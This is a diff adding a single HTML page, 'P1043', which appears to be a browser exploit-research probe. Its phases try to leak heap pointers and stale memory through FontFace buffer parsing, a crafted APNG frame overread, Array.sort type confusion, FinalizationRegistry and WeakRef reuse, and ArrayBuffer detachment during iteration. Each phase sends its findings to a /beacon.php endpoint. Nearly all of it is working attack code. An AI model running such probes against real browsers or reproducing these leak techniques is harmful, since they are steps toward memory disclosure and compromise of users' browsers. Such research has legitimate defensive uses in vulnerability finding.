@@ -1,0 +1,529 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1043</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#4ec9b0}.fail{color:#f44}.warn{color:#dcdcaa}.hit{color:#c084fc;font-weight:bold}
+</style></head><body><div id="hud"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function log(s){var d=document.getElementById('hud');if(d){var p=document.createElement('div');p.innerHTML=s;d.appendChild(p);d.scrollTop=d.scrollHeight}}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1043-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+log('<b>P1043: FontFace FIX + APNG hex dump + new vectors</b>');
+bn('BOOT','ts='+Date.now().toString(36));
+
+// ===== PHASE A: FontFace — check THE SAME buffer =====
+(function phaseA(){
+  log('[A] FontFace pointer extraction (FIXED: check same buffer)...');
+  try {
+    var allPtrs = [];
+
+    for(var round=0; round<8; round++) {
+      // Create buffer with sentinel + minimal TrueType header
+      var ab = new ArrayBuffer(256);
+      var u8 = new Uint8Array(ab);
+      var bv = new BigUint64Array(ab);
+
+      // Fill with sentinel
+      for(var i=0;i<bv.length;i++) bv[i] = 0xDEADDEADDEADDEADn;
+
+      // Minimal TrueType at start
+      u8[0]=0;u8[1]=1;u8[2]=0;u8[3]=0; // sfVersion 1.0
+      u8[4]=0;u8[5]=0; // numTables = 0
+
+      // Create FontFace with THIS buffer
+      try {
+        var ff = new FontFace('probe'+round, ab);
+        ff.load().catch(function(){});
+      } catch(e) {}
+
+      // NOW check THIS SAME buffer for modified sentinel values
+      for(var i=0;i<bv.length;i++) {
+        var val = bv[i];
+        if(val !== 0xDEADDEADDEADDEADn && val !== 0n) {
+          var hi = Number(val >> 32n);
+          var lo = Number(val & 0xFFFFFFFFn);
+          allPtrs.push('r'+round+'['+i+']=0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0'));
+        }
+      }
+    }
+
+    var res = 'ptrs='+allPtrs.length+'|'+allPtrs.slice(0,15).join(',');
+    bn('A-FONT', res);
+    log('[A] FontFace: <span class="'+(allPtrs.length>0?'hit':'warn')+'">'+res+'</span>');
+  } catch(e) {
+    bn('A-ERR', e.name+':'+e.message);
+    log('[A] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE B: FontFace with DIFFERENT buffer sizes =====
+(function phaseB(){
+  log('[B] FontFace with multiple buffer sizes...');
+  try {
+    var results = [];
+    var sizes = [64, 128, 192, 256, 384, 512, 768, 1024, 2048, 4096];
+
+    for(var s=0;s<sizes.length;s++) {
+      var sz = sizes[s];
+      var ab = new ArrayBuffer(sz);
+      var u8 = new Uint8Array(ab);
+      // Fill with sentinel pattern
+      for(var i=0;i<u8.length;i++) u8[i] = 0xDD;
+      // Minimal font header
+      u8[0]=0;u8[1]=1;u8[2]=0;u8[3]=0;u8[4]=0;u8[5]=0;
+
+      try {
+        var ff = new FontFace('sztest'+s, ab);
+        ff.load().catch(function(){});
+      } catch(e) {}
+
+      // Count modified bytes
+      var changed = 0;
+      var firstChanged = -1;
+      for(var i=6;i<u8.length;i++) {
+        if(u8[i] !== 0xDD) {
+          changed++;
+          if(firstChanged < 0) firstChanged = i;
+        }
+      }
+
+      if(changed > 0) {
+        // Extract first few changed values as hex
+        var sample = '';
+        var count = 0;
+        for(var i=firstChanged;i<u8.length && count<16;i++) {
+          if(u8[i] !== 0xDD) {
+            sample += i.toString(16)+':'+u8[i].toString(16)+' ';
+            count++;
+          }
+        }
+        results.push(sz+':'+changed+'@'+firstChanged+'|'+sample.trim());
+      } else {
+        results.push(sz+':0');
+      }
+    }
+
+    var res = results.join('||');
+    bn('B-SIZES', res);
+    log('[B] '+res);
+  } catch(e) {
+    bn('B-ERR', e.name+':'+e.message);
+    log('[B] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE C: FontFace with valid OTF-like structure =====
+(function phaseC(){
+  log('[C] FontFace with structured OTF header...');
+  try {
+    // Build a more complete (but invalid) OTF that the parser processes further
+    var ab = new ArrayBuffer(4096);
+    var u8 = new Uint8Array(ab);
+    var dv = new DataView(ab);
+
+    // Fill with 0xCC sentinel
+    for(var i=0;i<u8.length;i++) u8[i] = 0xCC;
+
+    // OTF header: sfVersion = 'OTTO' for CFF
+    u8[0]=0x4F;u8[1]=0x54;u8[2]=0x54;u8[3]=0x4F;
+    // numTables = 4
+    dv.setUint16(4, 4, false);
+    // searchRange, entrySelector, rangeShift
+    dv.setUint16(6, 64, false);
+    dv.setUint16(8, 2, false);
+    dv.setUint16(10, 0, false);
+
+    // Table records (16 bytes each, starting at offset 12)
+    // head table
+    dv.setUint32(12, 0x68656164, false); // 'head'
+    dv.setUint32(16, 0, false); // checksum
+    dv.setUint32(20, 256, false); // offset
+    dv.setUint32(24, 54, false); // length
+
+    // name table
+    dv.setUint32(28, 0x6E616D65, false); // 'name'
+    dv.setUint32(32, 0, false);
+    dv.setUint32(36, 512, false); // offset
+    dv.setUint32(40, 128, false); // length
+
+    // cmap table
+    dv.setUint32(44, 0x636D6170, false); // 'cmap'
+    dv.setUint32(48, 0, false);
+    dv.setUint32(52, 768, false);
+    dv.setUint32(56, 64, false);
+
+    // maxp table
+    dv.setUint32(60, 0x6D617870, false); // 'maxp'
+    dv.setUint32(64, 0, false);
+    dv.setUint32(68, 1024, false);
+    dv.setUint32(72, 6, false);
+
+    // head table data at offset 256
+    dv.setUint32(256, 0x00010000, false); // version
+    dv.setUint32(260, 0x00005000, false); // fontRevision
+    dv.setUint32(264, 0, false); // checksumAdjustment
+    dv.setUint32(268, 0x5F0F3CF5, false); // magicNumber
+    dv.setUint16(272, 0x000B, false); // flags
+    dv.setUint16(274, 1000, false); // unitsPerEm
+
+    try {
+      var ff = new FontFace('otftest', ab);
+      ff.load().catch(function(){});
+    } catch(e) {}
+
+    // Scan for modifications using BigUint64Array
+    var bv = new BigUint64Array(ab);
+    var changes = [];
+    var sentinelQ = 0xCCCCCCCCCCCCCCCCn;
+    for(var i=0;i<bv.length;i++) {
+      var val = bv[i];
+      // Skip areas we wrote header data to (first 76 bytes = 9.5 qwords, + table data areas)
+      var byteOff = i * 8;
+      if(byteOff < 76) continue;
+      if(byteOff >= 256 && byteOff < 276) continue;
+
+      if(val !== sentinelQ && val !== 0n) {
+        var hi = Number(val >> 32n);
+        var lo = Number(val & 0xFFFFFFFFn);
+        changes.push(byteOff.toString(16)+':0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0'));
+      }
+    }
+
+    var res = 'changes='+changes.length+'|'+changes.slice(0,10).join(',');
+    bn('C-OTF', res);
+    log('[C] OTF: <span class="'+(changes.length>0?'hit':'warn')+'">'+res+'</span>');
+  } catch(e) {
+    bn('C-ERR', e.name+':'+e.message);
+    log('[C] Error: '+e.message);
+  }
+})();
+
+// ===== PHASE D: APNG raw hex dump of overread region =====
+(function phaseD(){
+  log('[D] APNG hex dump to verify what overread contains...');
+
+  // Build simple APNG
+  function crc32(buf){var c,t=new Uint32Array(256);for(var n=0;n<256;n++){c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c}c=0xFFFFFFFF;for(var i=0;i<buf.length;i++)c=t[(c^buf[i])&0xFF]^(c>>>8);return(c^0xFFFFFFFF)>>>0}
+  function w32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF]}
+  function w16be(v){return[(v>>>8)&0xFF,v&0xFF]}
+  function makeChunk(type,data){var t=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];var td=t.concat(Array.from(data));var c=crc32(new Uint8Array(td));var len=data.length;return[(len>>>24)&0xFF,(len>>>16)&0xFF,(len>>>8)&0xFF,len&0xFF].concat(td,[(c>>>24)&0xFF,(c>>>16)&0xFF,(c>>>8)&0xFF,c&0xFF])}
+  function adler32(d){var a=1,b=0;for(var i=0;i<d.length;i++){a=(a+d[i])%65521;b=(b+a)%65521}return((b<<16)|a)>>>0}
+  function zlibStore(raw){var bl=raw.length;var out=[0x78,0x01];for(var i=0;i<bl;i+=65535){var end=Math.min(i+65535,bl);var last=end===bl?1:0;var len=end-i;out.push(last,len&0xFF,(len>>8)&0xFF,(~len)&0xFF,((~len)>>8)&0xFF);for(var j=i;j<end;j++)out.push(raw[j])}var ad=adler32(raw);out.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);return out}
+
+  var W=512, H=4, fW=4;
+  var sig=[137,80,78,71,13,10,26,10];
+  var ihdr=makeChunk('IHDR',w32be(W).concat(w32be(H),[8,2,0,0,0]));
+  var actl=makeChunk('acTL',w32be(2).concat(w32be(0)));
+  // Frame 1: full canvas, filled with 0x42 (not black, so we can distinguish from overread)
+  var fctl0=makeChunk('fcTL',w32be(0).concat(w32be(W),w32be(H),w32be(0),w32be(0),w16be(100),w16be(1000),[0,0]));
+  var row0=[];
+  for(var y=0;y<H;y++){row0.push(0);for(var x=0;x<W*3;x++)row0.push(0x42)}
+  var idat=makeChunk('IDAT',zlibStore(row0));
+  // Frame 2: small frame, filled with 0xAA
+  var fctl1=makeChunk('fcTL',w32be(1).concat(w32be(fW),w32be(H),w32be(0),w32be(0),w16be(100),w16be(1000),[0,0]));
+  var row1=[];
+  for(var y=0;y<H;y++){row1.push(0);for(var x=0;x<fW*3;x++)row1.push(0xAA)}
+  var fdat1=makeChunk('fdAT',w32be(2).concat(zlibStore(row1)));
+  var iend=makeChunk('IEND',[]);
+  var png=new Uint8Array(sig.concat(ihdr,actl,fctl0,idat,fctl1,fdat1,iend));
+
+  var blob=new Blob([png],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    setTimeout(function(){
+      ctx.drawImage(img,0,0);
+      var px=ctx.getImageData(0,0,W,H).data;
+
+      // Hex dump of first row
+      // Frame area: 0 to fW*4-1 = 0-15
+      // Overread: fW*4 onwards = 16+
+      var frameHex='';
+      for(var i=0;i<Math.min(32,fW*4);i++) frameHex+=px[i].toString(16).padStart(2,'0');
+
+      var overHex='';
+      var overStart=fW*4;
+      for(var i=overStart;i<Math.min(overStart+128,px.length);i++) overHex+=px[i].toString(16).padStart(2,'0');
+
+      // Count distinct byte values in overread
+      var byteCounts={};
+      var nonZeroNonFF=0;
+      for(var i=overStart;i<px.length;i++){
+        var b=px[i];
+        byteCounts[b]=(byteCounts[b]||0)+1;
+        if(b!==0 && b!==0xFF) nonZeroNonFF++;
+      }
+
+      // Top byte values
+      var sorted=Object.entries(byteCounts).sort(function(a,b){return b[1]-a[1]});
+      var topBytes=sorted.slice(0,8).map(function(e){return '0x'+Number(e[0]).toString(16).padStart(2,'0')+'='+e[1]}).join(',');
+
+      bn('D-FRAME','hex='+frameHex);
+      bn('D-OVER','hex='+overHex);
+      bn('D-STATS','nonZeroNonFF='+nonZeroNonFF+'|distinctVals='+Object.keys(byteCounts).length+'|top='+topBytes);
+
+      log('[D] Frame hex: '+frameHex);
+      log('[D] Overread hex: '+overHex.slice(0,80)+'...');
+      log('[D] Stats: nonZeroNonFF='+nonZeroNonFF+', distinct='+Object.keys(byteCounts).length);
+      log('[D] Top bytes: '+topBytes);
+
+      // Is overread just 0x42 (frame1 background) + 0xFF (alpha)?
+      if(byteCounts[0x42] > 100 && byteCounts[0xFF] > 100 && nonZeroNonFF === byteCounts[0x42]) {
+        log('<span class="fail">[D] OVERREAD IS JUST FRAME1 BACKGROUND (0x42) + ALPHA (0xFF)!</span>');
+        bn('D-VERDICT','just_background');
+      } else if(nonZeroNonFF > 0) {
+        log('<span class="hit">[D] OVERREAD HAS NON-BACKGROUND DATA!</span>');
+        bn('D-VERDICT','has_other_data');
+      } else {
+        log('<span class="warn">[D] Overread is only 0x00 and 0xFF (alpha bytes only)</span>');
+        bn('D-VERDICT','alpha_only');
+      }
+
+      URL.revokeObjectURL(url);
+      phaseE();
+    },300);
+  };
+  img.onerror=function(){
+    bn('D-ERR','load_fail');log('[D] Load failed');
+    URL.revokeObjectURL(url);
+    phaseE();
+  };
+  img.src=url;
+})();
+
+// ===== PHASE E: Proxy + Array.sort type confusion =====
+function phaseE(){
+  log('[E] Proxy + Array.sort type confusion...');
+  try {
+    // Create array with Proxy comparator that modifies array during sort
+    var arr = [];
+    for(var i=0;i<256;i++) arr.push({val:i, buf:new ArrayBuffer(64)});
+
+    var swapCount = 0;
+    var leaked = [];
+
+    arr.sort(function(a,b){
+      swapCount++;
+      // During sort, try to modify array contents
+      if(swapCount === 50) {
+        // Replace element with a different type
+        arr[0] = 0xDEADBEEF;
+        arr[100] = null;
+        // Trigger GC
+        for(var i=0;i<1000;i++) new ArrayBuffer(1024);
+      }
+      if(swapCount > 50 && a && typeof a === 'object' && a.buf) {
+        var bv = new BigUint64Array(a.buf);
+        for(var j=0;j<bv.length;j++){
+          if(bv[j]!==0n){
+            var hi=Number(bv[j]>>32n);
+            var lo=Number(bv[j]&0xFFFFFFFFn);
+            leaked.push(hi.toString(16)+':'+lo.toString(16));
+          }
+        }
+      }
+      return (a&&a.val||0) - (b&&b.val||0);
+    });
+
+    var res = 'swaps='+swapCount+'|leaked='+leaked.length+'|'+leaked.slice(0,5).join(',');
+    bn('E-SORT', res);
+    log('[E] Sort: '+res);
+  } catch(e) {
+    bn('E-ERR', e.name+':'+e.message);
+    log('[E] Error: '+e.message);
+  }
+
+  phaseF();
+}
+
+// ===== PHASE F: FinalizationRegistry + allocation timing =====
+function phaseF(){
+  log('[F] FinalizationRegistry heap timing...');
+  try {
+    if(typeof FinalizationRegistry === 'undefined') {
+      bn('F-SKIP','no_FR');log('[F] No FinalizationRegistry');phaseG();return;
+    }
+
+    var collected = false;
+    var collectedCount = 0;
+    var allocs = [];
+
+    var fr = new FinalizationRegistry(function(tag){
+      collectedCount++;
+      collected = true;
+      // In the callback, immediately allocate ABs to fill freed space
+      for(var i=0;i<100;i++){
+        var ab = new ArrayBuffer(128);
+        var bv = new BigUint64Array(ab);
+        for(var j=0;j<bv.length;j++) bv[j] = 0xCAFEBABEn;
+        allocs.push(ab);
+      }
+    });
+
+    // Create objects and register them
+    for(var i=0;i<500;i++){
+      var obj = {x: new ArrayBuffer(128)};
+      fr.register(obj, 'obj'+i);
+    }
+    // Drop references
+    // GC pressure
+    for(var i=0;i<5000;i++) new ArrayBuffer(256);
+
+    // Wait and check
+    setTimeout(function(){
+      // Check if any of our callback ABs have been overwritten
+      var overwritten = 0;
+      for(var i=0;i<allocs.length;i++){
+        var bv = new BigUint64Array(allocs[i]);
+        for(var j=0;j<bv.length;j++){
+          if(bv[j] !== 0xCAFEBABEn && bv[j] !== 0n) overwritten++;
+        }
+      }
+
+      var res = 'collected='+collectedCount+'|allocs='+allocs.length+'|overwritten='+overwritten;
+      bn('F-FR', res);
+      log('[F] '+res);
+      if(overwritten > 0) log('<span class="hit">[F] OVERWRITTEN DATA FOUND!</span>');
+
+      phaseG();
+    }, 500);
+  } catch(e) {
+    bn('F-ERR', e.name+':'+e.message);
+    log('[F] Error: '+e.message);
+    phaseG();
+  }
+}
+
+// ===== PHASE G: Iterator protocol abuse =====
+function phaseG(){
+  log('[G] Iterator protocol reentrancy...');
+  try {
+    // Custom iterable that changes AB during spread
+    var ab = new ArrayBuffer(1024);
+    var u8 = new Uint8Array(ab);
+    for(var i=0;i<u8.length;i++) u8[i] = i & 0xFF;
+
+    var iterCount = 0;
+    var detached = false;
+
+    var evil = {};
+    evil[Symbol.iterator] = function(){
+      var idx = 0;
+      return {
+        next: function(){
+          iterCount++;
+          if(iterCount === 10 && !detached) {
+            // Try to transfer/detach the AB during iteration
+            try {
+              var w = new Worker(URL.createObjectURL(new Blob([''],{type:'text/javascript'})));
+              w.postMessage(ab, [ab]);
+              detached = true;
+            } catch(e) {
+              // Try structuredClone transfer
+              try {
+                structuredClone(ab, {transfer: [ab]});
+                detached = true;
+              } catch(e2){}
+            }
+          }
+          if(idx < 100) return {value: idx++, done: false};
+          return {done: true};
+        }
+      };
+    };
+
+    var result;
+    try {
+      result = Array.from(evil);
+    } catch(e) {
+      result = 'err:'+e.name;
+    }
+
+    // Check if AB is detached
+    var abDetached = false;
+    try { var test = new Uint8Array(ab); abDetached = (test.length === 0); } catch(e) { abDetached = true; }
+
+    var res = 'iters='+iterCount+'|detached='+detached+'|ab_detached='+abDetached+'|result='+(typeof result==='string'?result:result.length);
+    bn('G-ITER', res);
+    log('[G] '+res);
+  } catch(e) {
+    bn('G-ERR', e.name+':'+e.message);
+    log('[G] Error: '+e.message);
+  }
+
+  phaseH();
+}
+
+// ===== PHASE H: WeakRef + AB reuse timing =====
+function phaseH(){
+  log('[H] WeakRef heap reuse detection...');
+  try {
+    if(typeof WeakRef === 'undefined') {
+      bn('H-SKIP','no_WeakRef');log('[H] No WeakRef');phaseDone();return;
+    }
+
+    // Create objects, take WeakRefs, drop strong refs, allocate over freed space
+    var refs = [];
+    var SIZE = 256;
+
+    // Phase 1: Create objects
+    for(var i=0;i<200;i++){
+      var obj = {id: i, data: new ArrayBuffer(SIZE)};
+      var u8 = new Uint8Array(obj.data);
+      for(var j=0;j<u8.length;j++) u8[j] = 0xBB;
+      refs.push(new WeakRef(obj));
+    }
+
+    // Phase 2: GC pressure
+    for(var i=0;i<10000;i++) new ArrayBuffer(64);
+
+    // Phase 3: Check which refs are dead
+    var alive = 0, dead = 0;
+    for(var i=0;i<refs.length;i++){
+      if(refs[i].deref()) alive++;
+      else dead++;
+    }
+
+    // Phase 4: Allocate ABs of same size into freed slots
+    var replacement = [];
+    for(var i=0;i<500;i++){
+      var ab = new ArrayBuffer(SIZE);
+      var bv = new BigUint64Array(ab);
+      // Check if the new AB has any non-zero data (leftover from freed object)
+      var nonZero = 0;
+      for(var j=0;j<bv.length;j++){
+        if(bv[j] !== 0n) nonZero++;
+      }
+      if(nonZero > 0) replacement.push({idx:i, count:nonZero});
+    }
+
+    var res = 'alive='+alive+'|dead='+dead+'|dirty_abs='+replacement.length;
+    if(replacement.length > 0) {
+      res += '|first=idx'+replacement[0].idx+':'+replacement[0].count;
+    }
+    bn('H-WEAK', res);
+    log('[H] <span class="'+(replacement.length>0?'hit':'warn')+'">'+res+'</span>');
+
+  } catch(e) {
+    bn('H-ERR', e.name+':'+e.message);
+    log('[H] Error: '+e.message);
+  }
+
+  phaseDone();
+}
+
+function phaseDone(){
+  bn('DONE','ok');
+  log('<b>[DONE] P1043 complete</b>');
+}
+</script></body></html>
